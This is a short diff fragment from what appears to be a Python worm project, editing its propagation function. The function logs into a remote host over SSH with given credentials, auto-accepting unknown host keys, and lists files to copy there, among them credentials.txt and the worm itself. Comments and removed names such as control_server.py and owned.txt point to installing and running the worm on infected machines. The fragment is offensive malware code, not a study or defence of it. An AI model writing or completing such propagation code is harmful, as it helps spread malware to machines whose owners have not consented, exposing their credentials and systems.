@@ -17,9 +17,9 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 PROPAGATION
 """
 def propagate(host,port,username,password):
-	#TODO run worm in the infected machine
+	#TODO install as a python module
 
-	files = ["config.json","credentials.txt","README.md","worm.py","control_server.py","owned.txt","requirements.txt"]
+	files = ["config.json","credentials.txt","worm","requirements.txt"]
 	try:
 		ssh = paramiko.SSHClient()
 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
